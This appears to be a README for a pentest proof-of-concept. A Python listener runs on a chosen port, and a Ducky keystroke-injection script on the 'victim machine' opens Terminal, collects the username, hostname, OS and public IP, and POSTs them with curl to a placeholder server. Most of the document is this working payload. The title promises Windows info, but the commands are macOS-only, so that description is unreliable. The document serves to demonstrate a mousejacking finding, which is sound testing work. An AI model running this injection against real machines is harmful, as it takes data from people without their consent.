Gather Windows Info for POC. A good use case is a POC for mousejacking finding on a pentest report.

Run the server and any port using:
```
python3 info_gather.py 80
```

On the victim machine, use a Ducky Script to send the info to the server host:
```
DELAY 2000
COMMAND SPACE  // Opens Spotlight Search
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING username=$(whoami);hostname=$(scutil --get ComputerName);os=$(sw_vers -productName);public_ip=$(curl -s ifconfig.me);data="{\"username\":\"$username\",\"hostname\":\"$hostname\",\"os\":\"$os\",\"public_ip\":\"$public_ip\"}";curl -X POST -H "Content-Type: application/json" -d "$data" http://yourserver.com
DELAY 500
ENTER
```
